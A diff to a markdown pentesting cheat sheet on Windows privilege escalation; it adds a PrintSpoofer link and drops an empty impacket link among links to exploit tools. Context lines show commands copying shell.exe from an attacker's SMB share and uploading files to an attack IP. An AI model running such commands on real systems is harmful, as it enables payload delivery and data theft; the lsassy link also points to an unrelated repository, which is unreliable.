@@ -168,7 +168,7 @@ https://github.com/rasta-mouse/Watson
 https://github.com/SecWiki/windows-kernel-exploits   
 
 ## Misc  
-
+[Print Sppofer](https://github.com/itm4n/PrintSpoofer)  
 [SYSTEM Nightmare](https://github.com/GossiTheDog/SystemNightmare) Print nightmare implementation   
 [CVE 2019-1388](https://github.com/jas502n/CVE-2019-1388)   
 ____   
@@ -234,7 +234,6 @@ ____
      copy \\10.6.85.85\kali\shell.exe C:\PrivEsc\shell.exe               #download from kali   
      copy C:\File \\[attack ip]\shareName\File                           #upload to kali  
 ## Remote Scripts  
-[impacket]()
 [lsassy](https://github.com/PowerShellMafia/PowerSploit): script to extract creds remotely using impacket  
 
 
